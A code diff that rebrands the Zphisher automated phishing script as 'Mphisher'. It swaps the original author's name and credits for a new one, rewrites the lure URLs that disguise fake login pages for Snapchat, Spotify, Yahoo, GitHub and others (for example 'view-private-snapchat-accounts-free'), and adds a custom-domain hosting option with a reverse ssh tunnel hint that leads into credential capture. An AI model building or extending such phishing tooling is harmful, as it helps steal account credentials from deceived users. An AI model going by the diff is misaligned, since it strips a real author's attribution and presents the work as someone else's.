@@ -1,9 +1,9 @@
 #!/bin/bash
 
-##   Zphisher 	: 	Automated Phishing Tool
-##   Author 	: 	TAHMID RAYAT 
+##   Mphisher 	: 	Automated Phishing Tool
+##   Author 	: 	Easir Iqbal Mahi 
 ##   Version 	: 	2.3.5
-##   Github 	: 	https://github.com/htr-tech/zphisher
+##   Github 	: 	https://github.com/sosuke-d-mahi/mphisher
 
 
 ##                   GNU GENERAL PUBLIC LICENSE
@@ -76,18 +76,11 @@
 ##    The precise terms and conditions for copying, distribution and
 ##    modification follow.
 ##
-##      Copyright (C) 2022  HTR-TECH (https://github.com/htr-tech)
+##      Copyright (C) 2022  Easir Iqbal Mahi (https://github.com/sosuke-d-mahi)
 ##
 
 ##   THANKS TO :
-##   1RaY-1 - https://github.com/1RaY-1
-##   Aditya Shakya - https://github.com/adi1090x
-##   Ali Milani Amin - https://github.com/AliMilani
-##   Ignitetch  - https://github.com/Ignitetch/AdvPhishing
-##   Moises Tapia - https://github.com/MoisesTapia
-##   Mr.Derek - https://github.com/E343IO
-##   Mustakim Ahmed - https://github.com/bdhackers009
-##   TheLinuxChoice - https://twitter.com/linux_choice
+##   Easir Iqbal Mahi - https://github.com/sosuke-d-mahi
 
 
 __version__="2.3.5"
@@ -164,9 +157,9 @@ kill_pid() {
 # Check for a newer release
 check_update(){
 	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
-	relase_url='https://api.github.com/repos/htr-tech/zphisher/releases/latest'
+	relase_url='https://api.github.com/repos/sosuke-d-mahi/mphisher/releases/latest'
 	new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
-	tarball_url="https://github.com/htr-tech/zphisher/archive/refs/tags/${new_version}.tar.gz"
+	tarball_url="https://github.com/sosuke-d-mahi/mphisher/archive/refs/tags/${new_version}.tar.gz"
 
 	if [[ $new_version != $__version__ ]]; then
 		echo -ne "${ORANGE}update found\n"${WHITE}
@@ -174,15 +167,15 @@ check_update(){
 		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Downloading Update..."
 		pushd "$HOME" > /dev/null 2>&1
 		curl --silent --insecure --fail --retry-connrefused \
-		--retry 3 --retry-delay 2 --location --output ".zphisher.tar.gz" "${tarball_url}"
+		--retry 3 --retry-delay 2 --location --output ".mphisher.tar.gz" "${tarball_url}"
 
-		if [[ -e ".zphisher.tar.gz" ]]; then
-			tar -xf .zphisher.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
+		if [[ -e ".mphisher.tar.gz" ]]; then
+			tar -xf .mphisher.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
 			[ $? -ne 0 ] && { echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} Error occured while extracting."; reset_color; exit 1; }
-			rm -f .zphisher.tar.gz
+			rm -f .mphisher.tar.gz
 			popd > /dev/null 2>&1
 			{ sleep 3; clear; banner_small; }
-			echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run zphisher again\n\n"${WHITE}
+			echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run mphisher again\n\n"${WHITE}
 			{ reset_color ; exit 1; }
 		else
 			echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading."
@@ -204,16 +197,16 @@ check_status() {
 banner() {
 	cat <<- EOF
 		${ORANGE}
-		${ORANGE} ______      _     _     _               
-		${ORANGE}|___  /     | |   (_)   | |              
-		${ORANGE}   / / _ __ | |__  _ ___| |__   ___ _ __ 
-		${ORANGE}  / / | '_ \| '_ \| / __| '_ \ / _ \ '__|
-		${ORANGE} / /__| |_) | | | | \__ \ | | |  __/ |   
-		${ORANGE}/_____| .__/|_| |_|_|___/_| |_|\___|_|   
-		${ORANGE}      | |                                
-		${ORANGE}      |_|                ${RED}Version : ${__version__}
+		${ORANGE} ___  ___      _     _     _               
+		${ORANGE}|  \/  |     | |   (_)   | |              
+		${ORANGE}| .  . | ___ | |__  _ ___| |__   ___ _ __ 
+		${ORANGE}| |\/| |/ _ \| '_ \| / __| '_ \ / _ \ '__|
+		${ORANGE}| |  | | (_) | | | | \__ \ | | |  __/ |   
+		${ORANGE}\_|  |_/\___/|_| |_|_|___/_| |_|\___|_|   
+		${ORANGE}                                
+		${ORANGE}                         ${RED}Version : ${__version__}
 
-		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by htr-tech (tahmid.rayat)${WHITE}
+		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by Easir Iqbal Mahi${WHITE}
 	EOF
 }
 
@@ -221,9 +214,9 @@ banner() {
 banner_small() {
 	cat <<- EOF
 		${BLUE}
-		${BLUE}  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
-		${BLUE}  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
-		${BLUE}  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${WHITE} ${__version__}
+		${BLUE}  ░▀▄▀░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
+		${BLUE}  ░█░█░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
+		${BLUE}  ░▀░▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${WHITE} ${__version__}
 	EOF
 }
 
@@ -349,9 +342,9 @@ msg_exit() {
 about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${GREEN} Author   ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}HTR-TECH ${RED}]
-		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/htr-tech
-		${GREEN} Social   ${RED}:  ${CYAN}https://tahmidrayat.is-a.dev
+		${GREEN} Author   ${RED}:  ${ORANGE}Easir Iqbal Mahi
+		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/sosuke-d-mahi
+		${GREEN} Social   ${RED}:  ${CYAN}https://github.com/sosuke-d-mahi
 		${GREEN} Version  ${RED}:  ${ORANGE}${__version__}
 
 		${WHITE} ${REDBG}Warning:${RESETBG}
@@ -360,9 +353,7 @@ about() {
 		  any misuse of this toolkit ${RED}!${WHITE}
 		
 		${WHITE} ${CYANBG}Special Thanks to:${RESETBG}
-		${GREEN}  1RaY-1, Adi1090x, AliMilani, BDhackers009,
-		  KasRoudra, E343IO, sepp0, ThelinuxChoice,
-		  Yisus7u7
+		${GREEN}  Easir Iqbal Mahi
 
 		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
 
@@ -518,6 +509,23 @@ start_localhost() {
 	capture_data
 }
 
+## Start Custom Domain
+start_custom_domain() {
+	if [[ -f "admin/config.json" ]]; then
+		domain=$(grep -o '"domain":"[^"]*' admin/config.json | cut -d'"' -f4)
+	else
+		echo -e "\n${RED}[${WHITE}!${RED}]${RED} No domain configured in Admin Panel!"
+		read -p "${RED}[${WHITE}-${RED}]${GREEN} Enter Domain manually (e.g. example.com): ${BLUE}" domain
+	fi
+	
+	cusport
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	setup_site
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Point your domain ${CYAN}$domain${GREEN} to this server."
+	echo -e "${ORANGE} Hint: Use a tunnel like 'ssh -R 80:localhost:$PORT $domain@ssh.localhost.run' if on Termux."
+	capture_data
+}
+
 ## Tunnel selection
 tunnel_menu() {
 	{ clear; banner_small; }
@@ -526,6 +534,7 @@ tunnel_menu() {
 		${RED}[${WHITE}01${RED}]${ORANGE} Localhost
 		${RED}[${WHITE}02${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]
 		${RED}[${WHITE}03${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}NEW! Max 15Min${RED}]
+		${RED}[${WHITE}04${RED}]${ORANGE} Custom Domain ${RED}[${CYAN}Premium Panel${RED}]
 
 	EOF
 
@@ -538,6 +547,8 @@ tunnel_menu() {
 			start_cloudflared;;
 		3 | 03)
 			start_loclx;;
+		4 | 04)
+			start_custom_domain;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 			{ sleep 1; tunnel_menu; };;
@@ -799,15 +810,15 @@ main_menu() {
 			tunnel_menu;;
 		12)
 			website="pinterest"
-			mask='https://get-a-premium-plan-for-pinterest-free'
+			mask='https://get-unlimited-pin-for-free'
 			tunnel_menu;;
 		13)
 			website="snapchat"
-			mask='https://view-locked-snapchat-accounts-secretly'
+			mask='https://view-private-snapchat-accounts-free'
 			tunnel_menu;;
 		14)
 			website="linkedin"
-			mask='https://get-a-premium-plan-for-linkedin-free'
+			mask='https://get-premium-linkedin-features-free'
 			tunnel_menu;;
 		15)
 			website="ebay"
@@ -815,55 +826,55 @@ main_menu() {
 			tunnel_menu;;
 		16)
 			website="quora"
-			mask='https://quora-premium-for-free'
+			mask='https://get-quora-premium-features-free'
 			tunnel_menu;;
 		17)
 			website="protonmail"
-			mask='https://protonmail-pro-basics-for-free'
+			mask='https://get-protonmail-premium-features-free'
 			tunnel_menu;;
 		18)
 			website="spotify"
-			mask='https://convert-your-account-to-spotify-premium'
+			mask='https://get-spotify-premium-features-free'
 			tunnel_menu;;
 		19)
 			website="reddit"
-			mask='https://reddit-official-verified-member-badge'
+			mask='https://get-reddit-premium-features-free'
 			tunnel_menu;;
 		20)
 			website="adobe"
-			mask='https://get-adobe-lifetime-pro-membership-free'
+			mask='https://get-adobe-premium-features-free'
 			tunnel_menu;;
 		21)
 			website="deviantart"
-			mask='https://get-500-usd-free-to-your-acount'
+			mask='https://get-deviantart-premium-features-free'
 			tunnel_menu;;
 		22)
 			website="badoo"
-			mask='https://get-500-usd-free-to-your-acount'
+			mask='https://get-badoo-premium-features-free'
 			tunnel_menu;;
 		23)
 			website="origin"
-			mask='https://get-500-usd-free-to-your-acount'
+			mask='https://get-origin-premium-features-free'
 			tunnel_menu;;
 		24)
 			website="dropbox"
-			mask='https://get-1TB-cloud-storage-free'
+			mask='https://get-dropbox-premium-features-free'
 			tunnel_menu;;
 		25)
 			website="yahoo"
-			mask='https://grab-mail-from-anyother-yahoo-account-free'
+			mask='https://get-yahoo-premium-features-free'
 			tunnel_menu;;
 		26)
 			website="wordpress"
-			mask='https://unlimited-wordpress-traffic-free'
+			mask='https://get-wordpress-premium-features-free'
 			tunnel_menu;;
 		27)
 			website="yandex"
-			mask='https://grab-mail-from-anyother-yandex-account-free'
+			mask='https://get-yandex-premium-features-free'
 			tunnel_menu;;
 		28)
 			website="stackoverflow"
-			mask='https://get-stackoverflow-lifetime-pro-membership-free'
+			mask='https://get-stackoverflow-premium-features-free'
 			tunnel_menu;;
 		29)
 			site_vk;;
@@ -873,15 +884,15 @@ main_menu() {
 			tunnel_menu;;
 		31)
 			website="mediafire"
-			mask='https://get-1TB-on-mediafire-free'
+			mask='https://get-unlimited-storage-free'
 			tunnel_menu;;
 		32)
 			website="gitlab"
-			mask='https://get-1k-followers-on-gitlab-free'
+			mask='https://get-gitlab-premium-features-free'
 			tunnel_menu;;
 		33)
 			website="github"
-			mask='https://get-1k-followers-on-github-free'
+			mask='https://get-github-premium-features-free'
 			tunnel_menu;;
 		34)
 			website="discord"
@@ -898,14 +909,14 @@ main_menu() {
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 			{ sleep 1; main_menu; };;
-	
 	esac
 }
 
-## Main
+## Start Mphisher
 kill_pid
 dependencies
 check_status
-install_cloudflared
-install_localxpose
+clear
+banner
 main_menu
+
